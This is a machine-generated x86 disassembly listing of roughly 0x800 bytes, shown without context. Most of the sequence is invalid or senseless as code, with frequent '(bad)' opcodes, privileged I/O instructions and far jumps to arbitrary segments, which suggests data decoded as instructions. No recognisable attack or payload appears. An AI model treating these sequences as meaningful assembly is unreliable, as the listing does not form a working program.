  414e26:	icebp  
  414e27:	sbb    dh,dl
  414e29:	adc    BYTE PTR [ebp-0x4ac0587c],ah
  414e2f:	xchg   ebp,eax
  414e30:	nop
  414e31:	leave  
  414e32:	hlt    
  414e33:	adc    eax,0x502e182d
  414e38:	mov    esi,0x678a826a
  414e3d:	lock cmp dl,cl
  414e40:	xchg   esp,eax
  414e41:	arpl   WORD PTR [edi],bp
  414e43:	mov    bh,0xaa
  414e45:	mov    bl,0xa7
  414e47:	shl    DWORD PTR [ebx+esi*2-0x3b41f74b],cl
  414e4e:	xchg   ebx,eax
  414e4f:	test   eax,0x9318354a
  414e54:	aaa    
  414e55:	hlt    
  414e56:	xchg   ebx,eax
  414e57:	dec    esi
  414e58:	add    dh,dl
  414e5a:	jb     0x414e27
  414e5c:	mov    DWORD PTR [eax+eax*4+0x6ac8790d],ecx
  414e63:	enter  0xdf97,0x6b
  414e67:	adc    BYTE PTR [edi+edx*4+0x1d897f11],ah
  414e6e:	hlt    
  414e6f:	(bad)  
  414e70:	in     eax,dx
  414e71:	das    
  414e72:	add    BYTE PTR [edx-0x5f],cl
  414e75:	mov    edi,0x4ffdb595
  414e7a:	leave  
  414e7b:	or     ecx,edx
  414e7d:	stos   BYTE PTR es:[edi],al
  414e7e:	ins    DWORD PTR es:[edi],dx
  414e7f:	inc    edi
  414e80:	mov    bl,BYTE PTR [ebp-0x5c7a56b3]
  414e86:	dec    eax
  414e87:	(bad)  
  414e89:	(bad)  
  414e8a:	mov    dl,0x1e
  414e8c:	loope  0x414e1b
  414e8e:	cld    
  414e8f:	aaa    
  414e90:	outs   dx,BYTE PTR ds:[esi]
  414e91:	pop    ebp
  414e92:	call   0xbfd16522
  414e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e98:	push   esi
  414e99:	xchg   esi,eax
  414e9a:	dec    ebp
  414e9b:	sbb    ecx,DWORD PTR [edx+0x44]
  414e9e:	(bad)  
  414e9f:	hlt    
  414ea0:	adc    BYTE PTR [esi+ecx*4+0x575bbe07],ch
  414ea7:	je     0x414e70
  414ea9:	mov    esp,0xd77c5071
  414eae:	mov    ecx,0x6e3641f5
  414eb3:	mov    al,0x53
  414eb5:	test   BYTE PTR [esi+0x33],0x99
  414eb9:	push   ds
  414eba:	add    esi,DWORD PTR [ecx-0x74bc0682]
  414ec0:	loop   0x414e59
  414ec2:	clc    
  414ec3:	les    edi,FWORD PTR [edi+ecx*2+0x1d076551]
  414eca:	not    esp
  414ecc:	dec    esi
  414ecd:	jp     0x414f27
  414ecf:	enter  0xcc9f,0x5
  414ed3:	mov    ds:0xd67d8d7,eax
  414ed8:	fiadd  WORD PTR [esi-0x62f5609e]
  414ede:	add    eax,0xe1e49749
  414ee3:	aaa    
  414ee4:	pop    edi
  414ee5:	frndint 
  414ee7:	xor    al,0x86
  414ee9:	jbe    0x414efa
  414eeb:	add    ebx,DWORD PTR [eax+edi*4]
  414eee:	lock loope 0x414eae
  414ef1:	mov    edx,0xcf0ff97
  414ef6:	scas   al,BYTE PTR es:[edi]
  414ef7:	mov    dh,bh
  414ef9:	jns    0x414efb
  414efb:	ret    0x23af
  414efe:	or     al,0x35
  414f00:	adc    cl,BYTE PTR [ebx]
  414f02:	ror    BYTE PTR [ecx+0x2be16c12],cl
  414f08:	sbb    al,0xc1
  414f0a:	add    edi,DWORD PTR [edx-0x23]
  414f0d:	mov    ebp,0xcc6e4384
  414f12:	push   eax
  414f13:	mov    cl,0x8
  414f15:	gs ret 0xb4a0
  414f19:	xchg   esp,eax
  414f1a:	sar    dl,cl
  414f1c:	aad    0x9d
  414f1e:	gs sub cl,0x9a
  414f22:	(bad)  
  414f23:	fdiv   QWORD PTR gs:[ecx+0x6b]
  414f27:	mov    esp,0xff01605b
  414f2c:	sar    BYTE PTR [ebx+0x1ee3d027],cl
  414f32:	sbb    edx,DWORD PTR [esp+esi*8+0x12208cf2]
  414f39:	mov    eax,0x5c925f03
  414f3e:	pop    eax
  414f3f:	fldenv [ebx+0x3e]
  414f42:	leave  
  414f43:	sti    
  414f44:	call   0xa2bc:0x9332ae43
  414f4b:	mov    esi,0x7e3440a
  414f50:	fidivr WORD PTR [eax-0x151d601]
  414f56:	enter  0x2745,0xa3
  414f5a:	xchg   DWORD PTR [ebp-0x67da5606],edi
  414f60:	or     al,0x53
  414f62:	into   
  414f63:	ins    BYTE PTR es:[edi],dx
  414f64:	sbb    al,BYTE PTR [esi+0x469ab4b3]
  414f6a:	addr16 addr16 xchg edx,eax
  414f6d:	in     eax,dx
  414f6e:	xchg   edi,eax
  414f6f:	push   edx
  414f70:	pop    eax
  414f71:	fucomip st,st(3)
  414f73:	dec    edi
  414f74:	das    
  414f75:	(bad)  
  414f76:	xchg   edx,eax
  414f77:	(bad)  
  414f78:	call   0x6fafa9e7
  414f7d:	test   BYTE PTR [edi],ah
  414f7f:	mov    al,ds:0xc83c9fef
  414f84:	stc    
  414f85:	mov    ds:0x4a171393,al
  414f8a:	(bad)  
  414f8b:	(bad)  
  414f8d:	shl    BYTE PTR [eax-0x20],0xeb
  414f91:	fnstcw WORD PTR [edx+eax*8+0x73]
  414f95:	pop    eax
  414f96:	int3   
  414f97:	dec    eax
  414f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f99:	sub    eax,0xcc208c51
  414f9e:	enter  0xf128,0x90
  414fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa3:	jmp    FWORD PTR [ebx-0x18]
  414fa6:	loopne 0x414fc2
  414fa8:	aas    
  414fa9:	sub    dh,BYTE PTR [ecx]
  414fab:	test   al,0x7c
  414fad:	xchg   edx,eax
  414fae:	fstp   st(5)
  414fb0:	dec    eax
  414fb1:	out    0x41,eax
  414fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb4:	neg    esi
  414fb6:	mov    ds:0x25bf1887,al
  414fbb:	test   bh,0x1f
  414fbe:	test   DWORD PTR [ecx],eax
  414fc0:	cmp    dl,ah
  414fc2:	sub    cl,BYTE PTR [ebp+0x37b6236]
  414fc8:	mov    ebx,0xcd978c27
  414fcd:	fadd   DWORD PTR [ebx*2-0x5883e381]
  414fd4:	add    al,0xaa
  414fd6:	into   
  414fd7:	mov    eax,ds:0xde5fd6a9
  414fdc:	lock pop ebx
  414fde:	cs stc 
  414fe0:	add    eax,esp
  414fe2:	mov    ah,0x23
  414fe4:	xor    BYTE PTR [ebx],cl
  414fe6:	shr    DWORD PTR [edx],cl
  414fe8:	mov    ecx,0x66d00b87
  414fed:	cmp    eax,0x54d34dc3
  414ff2:	add    bl,cl
  414ff4:	loop   0x414fa8
  414ff6:	popa   
  414ff7:	ficom  WORD PTR [esi-0x1a802f42]
  414ffd:	out    0x90,al
  414fff:	cs cwde 
  415001:	addr16 pop es
  415003:	sbb    al,al
  415005:	and    BYTE PTR [edx+ebx*2+0x3c],ch
  415009:	push   esp
  41500a:	and    eax,0x15f3d4e9
  41500f:	mov    gs,WORD PTR [ecx-0x4b]
  415012:	push   ecx
  415013:	hlt    
  415014:	adc    eax,0x67da3d09
  415019:	test   eax,0x8896268
  41501e:	pop    esp
  41501f:	dec    ecx
  415020:	xchg   esi,eax
  415021:	mov    dh,0x54
  415023:	dec    esp
  415024:	in     eax,dx
  415025:	sbb    eax,0xcb892b39
  41502a:	jo     0x41506e
  41502c:	xlat   BYTE PTR cs:[ebx]
  41502e:	cmc    
  41502f:	push   0x5283335f
  415034:	adc    DWORD PTR ds:0xb342c15d,edi
  41503a:	mov    DWORD PTR [ebx-0x50abfc16],eax
  415040:	cwde   
  415041:	cwde   
  415042:	mov    esi,0x57db0f66
  415047:	das    
  415048:	jnp    0x414fef
  41504a:	cmp    DWORD PTR [ebx],ebx
  41504c:	push   ebp
  41504d:	fidivr DWORD PTR [ebp-0x30]
  415050:	mov    gs,esp
  415052:	test   al,0x1e
  415054:	(bad)  
  415055:	push   edx
  415056:	dec    edi
  415057:	(bad)  [ecx]
  415059:	jae    0x415092
  41505b:	retf   
  41505c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41505d:	push   edi
  41505e:	xor    eax,0xd027a154
  415064:	leave  
  415065:	test   dh,ah
  415067:	mov    dl,0xbb
  415069:	(bad)  
  41506a:	mov    ebx,0xd4f7550b
  41506f:	and    eax,DWORD PTR [ecx]
  415071:	xchg   BYTE PTR [edx-0x4d873ddc],bh
  415077:	pop    edi
  415078:	dec    esi
  415079:	sub    eax,0x64eab918
  41507e:	gs ins BYTE PTR es:[edi],dx
  415080:	mov    bh,0xad
  415082:	test   DWORD PTR [edi+0x7b],edx
  415085:	mov    ss,WORD PTR [edi+0x1624ca94]
  41508b:	sub    eax,0xcea7211d
  415090:	xchg   ebx,ebp
  415092:	das    
  415093:	cs push cs
  415095:	xor    ecx,DWORD PTR ds:0x691dbb8
  41509b:	add    edi,ebp
  41509d:	xchg   edx,edi
  41509f:	ret    
  4150a0:	cmp    BYTE PTR [ebx-0x456d739a],bh
  4150a6:	jp     0x415058
  4150a8:	push   esp
  4150a9:	or     al,al
  4150ab:	aam    0x9
  4150ad:	scas   al,BYTE PTR es:[edi]
  4150ae:	(bad)  
  4150af:	imul   eax,eax,0x2c
  4150b2:	dec    edx
  4150b3:	push   es
  4150b4:	retf   
  4150b5:	inc    ecx
  4150b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150b7:	fld    DWORD PTR [edi]
  4150b9:	and    al,0xa9
  4150bb:	nop
  4150bc:	mov    dh,0x7e
  4150be:	sahf   
  4150bf:	dec    edx
  4150c0:	ret    
  4150c1:	out    0x9a,al
  4150c3:	mov    DWORD PTR [edx+edi*2-0x32],ebp
  4150c7:	test   BYTE PTR [edi+ebp*8-0x60],dl
  4150cb:	mov    ebx,es
  4150cd:	leave  
  4150ce:	mov    esp,0xcd32c0e3
  4150d3:	jb     0x415147
  4150d5:	add    DWORD PTR [esi],esp
  4150d7:	xor    DWORD PTR [ebx],ebp
  4150d9:	mov    edi,0x93fb924d
  4150de:	pop    eax
  4150df:	aad    0x19
  4150e1:	(bad)  
  4150e2:	into   
  4150e3:	out    dx,eax
  4150e4:	push   eax
  4150e5:	es cdq 
  4150e7:	mov    ch,cl
  4150e9:	pop    esi
  4150ea:	(bad)  
  4150eb:	sub    eax,0x3ecb5fde
  4150f0:	call   0x5bfdf299
  4150f5:	mov    dl,ah
  4150f7:	fwait
  4150f8:	push   esp
  4150f9:	je     0x4150c5
  4150fb:	inc    eax
  4150fc:	or     ebp,DWORD PTR [edi+0x53]
  4150ff:	ret    0x8250
  415102:	mov    ebp,0x96b09af1
  415107:	repz cld 
  415109:	mov    al,ds:0x31cb6e53
  41510e:	lods   eax,DWORD PTR ds:[esi]
  41510f:	loop   0x415143
  415111:	and    al,dl
  415113:	mov    ecx,0xfad6d814
  415118:	aaa    
  415119:	ror    ecx,0x37
  41511c:	mov    eax,0xf1c0547d
  415121:	sbb    eax,0xea319d17
  415126:	jns    0x41510e
  415128:	cmp    BYTE PTR [edi-0x73],ch
  41512b:	pop    esp
  41512c:	jp     0x415178
  41512e:	cmp    BYTE PTR [edx-0x6d],dh
  415131:	(bad)  
  415132:	repnz pop eax
  415134:	adc    DWORD PTR [esi],ecx
  415136:	push   ebp
  415137:	or     BYTE PTR [eax+0x69],ch
  41513a:	push   eax
  41513b:	fcomp  DWORD PTR [ecx-0x1cf68141]
  415141:	mov    al,BYTE PTR [ebx-0x49e2402]
  415147:	cld    
  415148:	adc    dl,BYTE PTR [ebx-0x54]
  41514b:	xor    BYTE PTR ds:[ecx+0x46],bl
  41514f:	adc    al,0xe
  415151:	adc    esp,esi
  415153:	xchg   edi,eax
  415154:	jb     0x415114
  415156:	adc    edx,DWORD PTR [ebp+0x4c]
  415159:	fnstsw WORD PTR [esi-0x27cb7964]
  41515f:	je     0x41514c
  415161:	out    0xb5,eax
  415163:	dec    ebp
  415164:	sub    ch,BYTE PTR [esi]
  415166:	rcr    DWORD PTR es:[ebp+ebx*4-0x53832c9a],cl
  41516e:	retf   
  41516f:	loopne 0x415132
  415171:	inc    ebp
  415172:	push   edx
  415173:	clc    
  415174:	lea    ebp,[eax]
  415176:	cmp    edi,DWORD PTR [ebx-0x41]
  415179:	jg     0x415143
  41517b:	xchg   ebx,eax
  41517c:	xchg   edx,eax
  41517d:	dec    edi
  41517e:	jbe    0x415189
  415180:	pop    ebx
  415181:	push   ds
  415182:	sub    bl,al
  415184:	out    0x42,eax
  415186:	int    0x71
  415188:	adc    bl,BYTE PTR [ebp-0x7747e032]
  41518e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41518f:	jo     0x4151c5
  415191:	fstp   QWORD PTR [edx+0x6f]
  415194:	out    0x42,al
  415196:	mov    esp,0xa3de7a63
  41519b:	(bad)  
  41519d:	lods   eax,DWORD PTR ds:[esi]
  41519e:	xchg   esi,eax
  41519f:	sahf   
  4151a0:	mov    BYTE PTR [ecx],bl
  4151a2:	aad    0x1e
  4151a4:	scas   al,BYTE PTR es:[edi]
  4151a5:	inc    ebp
  4151a6:	adc    DWORD PTR [esi-0x44],eax
  4151a9:	pop    ebp
  4151aa:	mov    ecx,esi
  4151ac:	xchg   ebp,eax
  4151ad:	cli    
  4151ae:	dec    ebp
  4151af:	mov    dh,bh
  4151b1:	sbb    cl,BYTE PTR [esi+0x3e]
  4151b4:	mov    WORD PTR [eax+0x9],ss
  4151b7:	cmp    dl,0x2e
  4151ba:	loope  0x4151a8
  4151bc:	rcr    DWORD PTR ds:0x9fda351c,1
  4151c2:	sbb    eax,0xd4000728
  4151c7:	fidiv  WORD PTR [ebp+0x1d]
  4151ca:	je     0x415206
  4151cc:	mov    eax,ds:0x28118f8
  4151d1:	pop    edi
  4151d2:	cmc    
  4151d3:	sub    edx,DWORD PTR [edx+0x5]
  4151d6:	xor    BYTE PTR [edx+0x5a298da4],cl
  4151dc:	adc    ebx,DWORD PTR [ebx]
  4151de:	aas    
  4151df:	xchg   DWORD PTR [ecx],ebx
  4151e1:	jo     0x415259
  4151e3:	mov    bl,0x46
  4151e5:	(bad)  
  4151e6:	and    ecx,ebp
  4151e8:	and    ebp,DWORD PTR [ebx]
  4151ea:	mov    edx,0xdb73d1c6
  4151ef:	dec    esp
  4151f0:	inc    eax
  4151f1:	and    eax,edi
  4151f3:	jl     0x415215
  4151f5:	stos   BYTE PTR es:[edi],al
  4151f6:	jae    0x4151cd
  4151f8:	enter  0xdf7e,0x94
  4151fc:	mov    dl,0x83
  4151fe:	(bad)  
  4151ff:	shr    DWORD PTR [eax],1
  415201:	jae    0x415237
  415203:	pop    es
  415204:	dec    ebp
  415205:	push   0x50cb8366
  41520a:	or     ecx,DWORD PTR ds:0x93ff1c25
  415210:	out    0x9,eax
  415212:	popf   
  415213:	fs pop edx
  415215:	xchg   esp,eax
  415216:	not    DWORD PTR [esi]
  415218:	outs   dx,DWORD PTR ds:[esi]
  415219:	mov    ch,0x8f
  41521b:	lahf   
  41521c:	aas    
  41521d:	pop    eax
  41521e:	sbb    edi,DWORD PTR [ecx+0x6f]
  415221:	leave  
  415222:	arpl   WORD PTR [eax],cx
  415224:	adc    BYTE PTR [ecx+0x2a1c5eaf],0xb8
  41522b:	jmp    FWORD PTR [edi+ebx*2+0x374751ca]
  415232:	jp     0x415226
  415234:	mov    ah,BYTE PTR [ecx]
  415236:	fs call 0x8a5c:0x4f74f47d
  41523e:	mov    edx,0xdc23820b
  415243:	ins    BYTE PTR es:[edi],dx
  415244:	stos   DWORD PTR es:[edi],eax
  415245:	ficomp WORD PTR [ecx+edx*4-0x31b5d94b]
  41524c:	add    BYTE PTR [esi-0x2cb52ea2],dl
  415252:	add    esi,DWORD PTR [eax-0x407cea5f]
  415258:	out    dx,al
  415259:	sub    ecx,edi
  41525b:	inc    esp
  41525c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41525d:	jo     0x41522f
  41525f:	or     DWORD PTR [esi],0xf2618721
  415265:	pop    esp
  415266:	sbb    BYTE PTR [ecx-0x7be12068],cl
  41526c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41526d:	int    0x52
  41526f:	clc    
  415270:	pop    es
  415271:	jbe    0x4151fb
  415273:	ds pop ss
  415275:	xor    al,0xf0
  415277:	call   0x327d387a
  41527c:	mov    ah,0x42
  41527e:	popa   
  41527f:	pop    ecx
  415280:	add    BYTE PTR [eax],dh
  415282:	push   0x42
  415284:	add    dh,dl
  415286:	and    cl,dl
  415288:	(bad)  
  415289:	mov    ah,0xb7
  41528b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41528c:	mov    ds:0x91bc59ba,eax
  415291:	inc    ebx
  415292:	sahf   
  415293:	mov    bl,0x43
  415295:	out    0x26,eax
  415297:	mov    bh,0x62
  415299:	mov    esp,0x21f26e6d
  41529e:	inc    ebp
  41529f:	fild   QWORD PTR [ebp+0x6f]
  4152a2:	xchg   ebx,eax
  4152a3:	rol    BYTE PTR [edx],1
  4152a5:	ins    BYTE PTR es:[edi],dx
  4152a6:	or     BYTE PTR [ebp-0x41751fa1],bl
  4152ac:	dec    edi
  4152ad:	retf   
  4152ae:	xlat   BYTE PTR ds:[ebx]
  4152af:	stc    
  4152b0:	pop    ds
  4152b1:	push   edx
  4152b2:	push   DWORD PTR ds:0x5a510b88
  4152b8:	sub    DWORD PTR [esp+eiz*4],esp
  4152bb:	je     0x4152a7
  4152bd:	nop
  4152be:	pop    es
  4152bf:	dec    ebp
  4152c0:	jmp    0x415245
  4152c2:	test   BYTE PTR ds:0x3ba90536,dh
  4152c8:	idiv   dh
  4152ca:	jmp    0x4892:0x80b8ac0e
  4152d1:	xor    al,0x9c
  4152d3:	sbb    al,0xac
  4152d5:	add    eax,0xba159de6
  4152da:	xchg   esi,eax
  4152db:	(bad)
  4152e0:	addr16 icebp 
  4152e2:	xchg   esp,eax
  4152e3:	bound  eax,QWORD PTR [esi]
  4152e5:	push   edi
  4152e6:	shr    BYTE PTR [esi+ebp*8],1
  4152e9:	out    0xdc,al
  4152eb:	leave  
  4152ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ed:	mov    bh,0x19
  4152ef:	jge    0x415303
  4152f1:	or     ebp,DWORD PTR [edi+0x62bd9006]
  4152f7:	jae    0x415307
  4152f9:	jo     0x415336
  4152fb:	js     0x415289
  4152fd:	jbe    0x415292
  4152ff:	or     BYTE PTR [edi],bl
  415301:	sbb    al,0x6
  415303:	jne    0x415375
  415305:	std    
  415306:	adc    ah,BYTE PTR [eax-0x7236f68a]
  41530c:	add    bh,ch
  41530e:	int    0x0
  415310:	mov    eax,esp
  415312:	ret    0xde22
  415315:	lds    edx,FWORD PTR [edx+0x42842b70]
  41531b:	add    cl,BYTE PTR ds:0x41fb7c74
  415321:	clc    
  415322:	pushf  
  415323:	cmp    esp,DWORD PTR [eax-0x66]
  415326:	lds    ecx,FWORD PTR [ebx+eax*8+0x1fab528f]
  41532d:	cmp    ebp,DWORD PTR [edx+eiz*4]
  415330:	add    cl,al
  415332:	cmp    eax,0x8771e7b4
  415337:	fidivr DWORD PTR [ecx-0x518e6ae2]
  41533d:	test   eax,0x5bdc9041
  415342:	mov    ebx,ebp
  415344:	push   ebp
  415345:	test   DWORD PTR [ebp-0x6e],esi
  415348:	rol    BYTE PTR [ebx+0x3d],cl
  41534b:	nop
  41534c:	and    al,0xe5
  41534e:	pushf  
  41534f:	push   ds
  415350:	popf   
  415351:	adc    DWORD PTR [esp+ebx*1-0x18],ebx
  415355:	jmp    0xc34d244c
  41535a:	(bad)  
  41535b:	sub    al,0xc0
  41535d:	sub    ebx,DWORD PTR [ebp+0x70b11449]
  415363:	test   BYTE PTR [edi+0xc],bh
  415366:	call   0xab12e5aa
  41536b:	push   ebp
  41536c:	jns    0x4153d8
  41536e:	pop    es
  41536f:	adc    al,0xb3
  415371:	das    
  415372:	or     DWORD PTR fs:[esi-0x39709b5c],esp
  415379:	fs into 
  41537b:	in     al,dx
  41537c:	bswap  eax
  41537e:	das    
  41537f:	push   esi
  415380:	imul   ebp,DWORD PTR [ecx-0x60],0x19
  415384:	push   ecx
  415385:	pop    ebx
  415386:	pop    ebp
  415387:	imul   ebx,DWORD PTR [ebx-0x1b],0xffffffdc
  41538b:	in     eax,dx
  41538c:	sub    bl,BYTE PTR [eax+edx*2]
  41538f:	dec    edi
  415390:	in     al,0x15
  415392:	fdiv   st(4),st
  415394:	shl    edx,1
  415396:	or     ebp,ebx
  415398:	stos   DWORD PTR es:[edi],eax
  415399:	or     edx,edx
  41539b:	loopne 0x4153bf
  41539d:	(bad)  
  41539e:	je     0x4153bd
  4153a0:	retf   0xdb4f
  4153a3:	imul   edi,edx,0xffffffdb
  4153a6:	sbb    BYTE PTR [ebx-0x7580907],bh
  4153ac:	mov    BYTE PTR ds:0x2ae1fa6c,bh
  4153b2:	or     DWORD PTR [ebp+0x6c63e24e],0xffffff83
  4153b9:	das    
  4153ba:	jb     0x4153c0
  4153bc:	jo     0x41543c
  4153be:	fisub  WORD PTR [edx-0x5e1c4ed]
  4153c4:	and    ebp,DWORD PTR [edx+edx*1]
  4153c7:	xchg   esp,eax
  4153c8:	call   0x5eed:0xe030609c
  4153cf:	add    bl,BYTE PTR [ebx-0x77]
  4153d2:	dec    edi
  4153d3:	js     0x415394
  4153d5:	out    dx,al
  4153d6:	mov    eax,ds:0x1fa2db1a
  4153db:	lods   al,BYTE PTR ds:[esi]
  4153dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153dd:	aas    
  4153de:	shl    DWORD PTR [eax],0x24
  4153e1:	jmp    0xed0d:0xe6a9a790
  4153e8:	loopne 0x415371
  4153ea:	(bad)  
  4153eb:	(bad)
  4153ef:	je     0x4153bb
  4153f1:	gs xchg ebx,eax
  4153f3:	sbb    cl,BYTE PTR [ebx-0x39]
  4153f6:	mov    eax,DWORD PTR [esi+0x24f21ff8]
  4153fc:	retf   0x8da7
  4153ff:	scas   eax,DWORD PTR es:[edi]
  415400:	adc    BYTE PTR [ecx-0x37e92c2f],dh
  415406:	mov    esp,0x89b10241
  41540b:	cli    
  41540c:	mov    cl,0x80
  41540e:	inc    edx
  41540f:	add    dl,BYTE PTR [eax-0x4f]
  415412:	mov    bl,0xb0
  415414:	cdq    
  415415:	fdiv   QWORD PTR ds:0xa8af2fda
  41541b:	inc    ecx
  41541c:	idiv   BYTE PTR [ebx]
  41541e:	xchg   DWORD PTR [ebx+0x6244e55a],esp
  415424:	cs sbb cl,dh
  415427:	sbb    eax,0x86c9ac10
  41542c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41542d:	inc    edi
  41542e:	in     eax,dx
  41542f:	addr16 xor eax,0x292985f2
  415435:	sti    
  415436:	add    DWORD PTR [edx+0x70],0xffffffb0
  41543a:	out    dx,al
  41543b:	or     eax,0xab1b7817
  415440:	(bad)  
  415442:	jo     0x415485
  415444:	pop    ds
  415445:	or     DWORD PTR ds:[ecx],ebx
  415448:	fdivr  DWORD PTR [edx+eiz*2+0x1abeeda3]
  41544f:	imul   edi,DWORD PTR [edx],0xa9328c76
  415455:	gs add dl,bh
  415458:	mov    dl,0x50
  41545a:	xor    BYTE PTR [edx+0x33592dec],dl
  415460:	sbb    ah,BYTE PTR [ecx+0x730886c5]
  415466:	xor    al,0xeb
  415468:	and    bl,BYTE PTR [ebx]
  41546a:	inc    esp
  41546b:	mov    al,ds:0xe3f81266
  415470:	mov    esp,esi
  415472:	push   edi
  415473:	adc    bh,BYTE PTR [ebp-0x7e]
  415476:	addr16 push ecx
  415478:	inc    eax
  415479:	hlt    
  41547a:	les    edi,FWORD PTR [edx+edx*2-0x74ae4c30]
  415481:	call   0x3174:0x383975ac
  415488:	not    BYTE PTR [esi+0x68f6dafd]
  41548e:	stos   BYTE PTR es:[edi],al
  41548f:	adc    BYTE PTR [edi-0x3a986b3e],bh
  415495:	loopne 0x4154cc
  415497:	shl    BYTE PTR [edi],cl
  415499:	pusha  
  41549a:	icebp  
  41549b:	imul   edi,ebp,0x6d50bb93
  4154a1:	imul   ecx,esp,0x24b62ba4
  4154a7:	test   al,0xf4
  4154a9:	int3   
  4154aa:	mov    bh,0x1c
  4154ac:	loop   0x41544b
  4154ae:	dec    edi
  4154af:	sub    al,0x55
  4154b1:	xor    eax,0xc23768f
  4154b6:	imul   BYTE PTR [ebx]
  4154b8:	pop    edi
  4154b9:	shr    BYTE PTR [ecx+0x74],0xb4
  4154bd:	xor    edi,DWORD PTR [edi+0x34]
  4154c0:	aam    0x9b
  4154c2:	dec    BYTE PTR [eax-0x67861137]
  4154c8:	add    esi,DWORD PTR [ebx]
  4154ca:	inc    ecx
  4154cb:	inc    ecx
  4154cc:	js     0x415459
  4154ce:	dec    ecx
  4154cf:	xchg   ebx,eax
  4154d0:	bound  esp,QWORD PTR [edx]
  4154d2:	jl     0x415475
  4154d4:	jle    0x415507
  4154d6:	fistp  DWORD PTR es:[esi+0x2d]
  4154da:	sbb    eax,0x5f63d4bd
  4154df:	dec    esi
  4154e0:	repnz push cs
  4154e2:	jmp    0x415537
  4154e4:	xor    DWORD PTR [esi-0x10],0x9ab89ed0
  4154eb:	rcr    BYTE PTR [ebp+0x20],1
  4154ee:	test   DWORD PTR [ebp+0x5d695ec],ebx
  4154f4:	and    DWORD PTR [ebp-0x60d7c88],0x704ada6a
  4154fe:	popa   
  4154ff:	leave  
  415500:	or     edi,eax
  415502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415503:	retf   
  415504:	nop
  415505:	addr16 jle 0x4154c3
  415508:	in     eax,0x81
  41550a:	sub    al,0x79
  41550c:	pop    ss
  41550d:	push   0x20fd7300
  415512:	inc    edi
  415513:	lahf   
  415514:	adc    al,0x85
  415516:	push   ecx
  415517:	inc    ecx
  415518:	xchg   ebp,eax
  415519:	lods   al,BYTE PTR ds:[esi]
  41551a:	test   al,0x1b
  41551c:	sbb    al,0xf3
  41551e:	aam    0x17
  415520:	add    eax,0x7449e00e
  415525:	jecxz  0x4154fa
  415527:	push   esp
  415528:	xchg   esp,eax
  415529:	sbb    al,0x42
  41552b:	push   ebx
  41552c:	ds mov esi,0x501a65e3
  415532:	jno    0x415512
  415534:	mov    eax,0x357c8bb7
  415539:	jo     0x4154ce
  41553b:	push   0xffffffdd
  41553d:	add    al,0xa
  41553f:	push   cs
  415540:	push   0x7cb6c955
  415545:	pop    eax
  415546:	xor    al,0x9b
  415548:	into   
  415549:	(bad)  
  41554a:	in     al,dx
  41554b:	inc    edi
  41554c:	adc    BYTE PTR [eax+0x69b5d991],cl
  415552:	adc    eax,0x6f414572
  415557:	cli    
  415558:	sub    BYTE PTR [edx-0x29497f0],ah
  41555e:	(bad)  
  415560:	mov    ah,0x1b
  415562:	pop    edx
  415563:	(bad)  
  415564:	mov    ds:0x4cdd1c9f,al
  415569:	fimul  WORD PTR [ecx+0x62f244d7]
  41556f:	in     eax,dx
  415570:	mov    edi,0x9a594586
  415575:	pop    ebx
  415576:	dec    ecx
  415577:	mov    al,ds:0xeba45cae
  41557c:	aas    
  41557d:	adc    BYTE PTR [edx-0x3eec3c75],al
  415583:	sbb    ecx,DWORD PTR [esi-0x770c618b]
  415589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41558a:	pop    es
  41558b:	es jae 0x41555e
  41558e:	jb     0x4155f0
  415590:	test   DWORD PTR [edx-0x18292ce9],0x83f534cb
  41559a:	dec    ebx
  41559b:	sar    DWORD PTR ds:0xb9f733dd,1
  4155a1:	jmp    0x68488a40
  4155a6:	push   es
  4155a7:	outs   dx,DWORD PTR ds:[esi]
  4155a8:	jecxz  0x4155ec
  4155aa:	js     0x415579
  4155ac:	clc    
  4155ad:	retf   
  4155ae:	ret    0x9593
  4155b1:	sahf   
  4155b2:	adc    esp,DWORD PTR [eax+0x4522913b]
  4155b8:	mov    esi,0x81dcc615
  4155bd:	push   es
  4155be:	clc    
  4155bf:	shr    DWORD PTR [ecx-0x15],cl
  4155c2:	das    
  4155c3:	mov    dh,0xa5
  4155c5:	jb     0x4155c1
  4155c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c9:	push   ebx
  4155ca:	pusha  
  4155cb:	cld    
  4155cc:	das    
  4155cd:	aam    0xa5
  4155cf:	mov    bh,0x48
  4155d1:	fdivrp st(0),st
  4155d3:	popf   
  4155d4:	fadd   QWORD PTR [ebx]
  4155d6:	cmovnp ebx,DWORD PTR [edi+ecx*2-0x3e173c0]
  4155de:	lahf   
  4155df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155e0:	hlt    
  4155e1:	bound  esp,QWORD PTR [eax-0x2efe5a79]
  4155e7:	adc    eax,0x5c0b7153
  4155ec:	push   eax
  4155ed:	jnp    0x4155da
  4155ef:	lods   al,BYTE PTR ds:[esi]
  4155f0:	fld    DWORD PTR [esi]
  4155f2:	and    bh,BYTE PTR [edx+eax*1-0x10]
  4155f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155f7:	vpunpckhbw xmm5,xmm7,XMMWORD PTR [eax+0x72]
  4155fc:	sbb    eax,0x26cc2637
  415601:	push   esp
  415602:	js     0x4155be
  415604:	call   0x92c8:0x4c1111ae
  41560b:	xchg   edx,eax
  41560c:	cmp    dl,bl
  41560e:	pop    ebp
  41560f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415610:	gs (bad) 
  415612:	mov    ecx,0x16ff892d
  415617:	js     0x4155c8
  415619:	std    
  41561a:	mov    cl,0xc1
